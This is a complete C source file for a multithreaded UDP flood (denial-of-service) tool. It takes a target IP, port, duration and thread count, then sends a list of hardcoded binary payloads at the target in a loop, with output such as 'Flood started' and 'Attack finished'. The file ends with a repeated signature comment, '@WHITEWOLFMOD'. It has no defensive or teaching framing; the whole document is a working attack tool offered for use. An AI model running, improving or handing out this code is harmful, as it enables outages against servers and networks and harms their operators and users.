#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

void usage() {
    printf("Usage: ./program ip port time threads\n");
    exit(1);
}

struct thread_data {
    char *ip;
    int port;
    int time;
};

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    char *payloads[] = {
        "\xd9\x00",
        "\x00\x00",
        "\x00\x00",
        "\x00\x00",
        "\x00\x00",
        "\x00\x00",
        "\x04\x00\x00\x00\x04imd\xB0\x00|\xB9\xFE\x01\x01\x1A\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x01\xFF\xFF\xFF\xFF\xFF\x00\x00\x00\x00\x00\x00\x00\x00\x05@}\x3DED\xE8\x1B=C\x9B_*\xFB}tC\x84\x1DB\x67\t\x856V\x1BF\xA1\x9E\xA4\x0CwfG*J\x8EC$\n9KJ\x05Yv\xF3\xF6\x17\x00;\x80r\x81N\xB9~t\x94\x0E\xDB\xF8\xD3\xE1\x8B}E\x00",
        "\x04\x00\x00\x00\x04imd\xB0\x00|\xB9\xFE\x01\x01\x1A\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x01\xFF\xFF\xFF\xFF\xFF\x00\x00\x00\x00\x00\x00\x00\x00\x05@}\x3DED\xE8\x1B=C\x9B_*\xFB}tC\x84\x1DB\x67\t\x856V\x1BF\xA1\x9E\xA4\x0CwfG*J\x8EC$\n9KJ\x05Yv\xF3\xF6\x17\x00;\x80r\x81N\xB9~t\x94\x0E\xDB\xF8\xD3\xE1\x8B}E\x00",
        "\x04\x00\x00\x00\x04imd\xB0\x00|\xB9\xFE\x01\x01\x1A\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x01\xFF\xFF\xFF\xFF\xFF\x00\x00\x00\x00\x00\x00\x00\x00\x05@}\x3DED\xE8\x1B=C\x9B_*\xFB}tC\x84\x1DB\x67\t\x856V\x1BF\xA1\x9E\xA4\x0CwfG*J\x8EC$\n9KJ\x05Yv\xF3\xF6\x17\x00;\x80r\x81N\xB9~t\x94\x0E\xDB\xF8\xD3\xE1\x8B}E\x00",
        "\x28\xC6X\xF5\x86\xF3Lza\xDAF>h\x81]\xAC9@ZJ\x16\xC4\x9E\xA9$Dq;xwQ\xEC\x88XE\x05\x82\xA3\xFD\xF6\\\xBC[\xC80Y\xE6'\xD8G;\xEFC0D\x00\x93\xB0\xF46Sda/K\xC6\x17\xC1\xCF\xFF\xABdbr-\xE1",
        "\x28\xC6X\xF5\xC2\xF3Lza\xFA\x42\xD2\x31\xB2\xDD\xC80r\x1CE0\x9AD\xC3\x9ABA\x90\xA8\x85\x0F/]\x2D\xE7\x9B\x94Y73\x96=)\x2B\x84\xD4Z\x05\x16\xF6$\xE3\xE9\xC2_Y=]\x83\x1BVY\x6B\x86\xBE\xB8\xF1\xAAW\xEF$X\xDBt\x13\xC9\xBF\xB8i\x8B\xAD\x9D\xCD\x1A;\xD8\x1A\xB8\x9E\xAA\\~\x94\xF5Q\x08\xF1\xA3\x83\xD2\x1C\xB6\xE3\x0B\xD09\xFBbUEf|yzXo\xC2\xE8\xA7",
        "\x28\xC6X\xF5\xC2\xF3Lza\xFA\x42\xD2\x31\xB2\xDD\xC80r\x1CE0\x9AD\xC3\x9ABA\x90\xA8\x85\x0F/]\x2D\xE7\x9B\x94Y73\x96=)\x2B\x84\xD4Z\x05\x16\xF6$\xE3\xE9\xC2_Y=]\x83\x1BVY\x6B\x86\xBE\xB8\xF1\xAAW\xEF$X\xDBt\x13\xC9\xBF\xB8i\x8B\xAD\x9D\xCD\x1A;\xD8\x1A\xB8\x9E\xAA\\~\x94\xF5Q\x08\xF1\xA3\x83\xD2\x1C\xB6\xE3\x0B\xD09\xFBbUEf|yzXo\xC2\xE8\xA7",
        "(\x28\xC6X\xF5\xDAZ\x4Cza\xFA\x42\xD2\x31\xB2\xDD\x04,\xB4\xD4\xE62\xD8C\x0F0g\xA1\x03]",
        "(\x28\xC6X\xF5>\x5ALza\xFA\x42\xD2\x31\xB2\xDD\\\x2C4\xE7\xE6n\xD9\xC3\x8D0'\xA7)",
        "(\x28\xC6X\xF5\xE6^\x4Cza\xFA\x42\xD2\x31\xB2\xDDh\x19\xF4\xF0\xD8\xDA\xD6Csr=\xD5\x16<\x44\xF8\xFB4\xD0^i\x383&\x14\x04\r+$\xCB\xEF\x01Xz\x905]\x15\x9A\x1CE-\xBE\x1EP\x9DAf\x4C\x88\xA8u\xF9\xEE/\\\x18\xA1gB\xD8\xBD\xEF\xD6\x01\x89\xA5\x93\xE9\xCC\x1D\x9E\xDC\xB0.\xFD\xC9g\xB3\x16(\x2B &\\\xB2o\xE3,]\x50Xg:;\xF6V\xBAI\xF6\xAE2sF$S\\\xDABA#\xF3,\t\xD0\xC6","B\x8A\xE9\xE1hLD\x07\x89\x94\x8F7D&\\x91J\x0C\x17:~\xF5\xBFP&\x1AAAz`\xD9\r3TE!\x21\xF1\xC4o+\x8B!_\x28o\xC5\xB31c\x68\xADC\x0AETC~\x97\x12\xDA\x95\x13\n\x11\xA2",'\x80S]\x07\x1Cac\x959\x8B\xA5c$t\xAE\xE9\x04\xD3\xB0\xF0\xDD-\xE4\xE0j\xB3?i\x91CWLs\x82\xC7dU\x10\x91|\xFD\xF8\xD0m\x81\x81\xEA\x8C\x95\xBC\xC4t\xA3>[\xCE!E\xC1\xBE\x1D\x00",




    };

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    endtime = time(NULL) + data->time;

    while (time(NULL) <= endtime) {
        for (int i = 0; i < sizeof(payloads) / sizeof(payloads[0]); i++) {
            if (sendto(sock, payloads[i], strlen(payloads[i]), 0,
                       (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                close(sock);
                pthread_exit(NULL);
            }
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int threads = atoi(argv[4]);
    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    struct thread_data data = {ip, port, time};

    printf("Flood started on %s:%d for %d seconds with %d threads\n", ip, port, time, threads);

    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_ids[i], NULL, attack, (void *)&data) != 0) {
            perror("Thread creation failed");
            free(thread_ids);
            exit(1);
        }
        printf("Launched thread with ID: %lu\n", thread_ids[i]);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);
    printf("Attack finished\n");
    return 0;
}
/*
@WHITEWOLFMOD

@WHITEWOLFMOD

@WHITEWOLFMOD

@WHITEWOLFMOD

@WHITEWOLFMOD

@WHITEWOLFMOD

@WHITEWOLFMOD

@WHITEWOLFMOD

@WHITEWOLFMOD
*/
